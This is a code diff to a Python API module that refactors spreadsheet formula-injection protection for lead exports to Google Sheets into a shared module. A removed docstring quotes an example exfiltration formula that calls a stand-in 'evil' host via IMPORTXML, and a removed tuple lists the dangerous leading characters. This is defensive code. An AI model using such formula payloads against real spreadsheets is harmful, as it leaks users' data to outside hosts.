@@ -48,6 +48,7 @@ from sqlalchemy.ext.asyncio import AsyncSession
 
 from apps.api.core.logging import get_logger, redact_mapping
 from apps.api.core.queue import WORKER_MAX_TRIES
+from apps.api.core.spreadsheet_safety import disarm_for_sheets
 from apps.api.db.base import uuid7
 from apps.api.db.result import rowcount_of
 from apps.api.reliability.service import enqueue_outbox
@@ -444,7 +445,6 @@ DEFAULT_SHEET_COLUMNS: dict[str, tuple[str, ...]] = {
 # Sheets formulas; `+` and `-` are Excel's, which matters the moment the client exports
 # to CSV. A lead's name is written by a caller or a web form, so this is untrusted text
 # landing in a document a human opens.
-_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
 
 
 def parse_spreadsheet_ref(url: str | None) -> str | None:
@@ -524,14 +524,14 @@ def _cell(value: Any) -> str:
 
 
 def _disarm(rendered: str) -> str:
-    """Neutralise spreadsheet formula injection, belt and braces with `RAW` input.
+    """Neutralise spreadsheet formula injection for the SHEETS consumer.
 
-    The leading apostrophe is Sheets' own "this is text" marker: it is NOT shown in the
-    rendered cell, so a phone number still reads as a phone number while
-    `=IMPORTXML("https://evil…"&A1,"//x")` — a name a caller can choose — stays a
-    string instead of exfiltrating the row it sits in.
+    The leader set is shared with the CSV export (`core.spreadsheet_safety`) so a newly
+    discovered dangerous character is added in one place; the RENDERING is not shared,
+    because Sheets' apostrophe marker is invisible there and visible in a CSV. That
+    module carries the argument and the OWASP sources.
     """
-    return f"'{rendered}" if rendered[:1] in _FORMULA_LEADERS else rendered
+    return disarm_for_sheets(rendered)
 
 
 __all__ = [
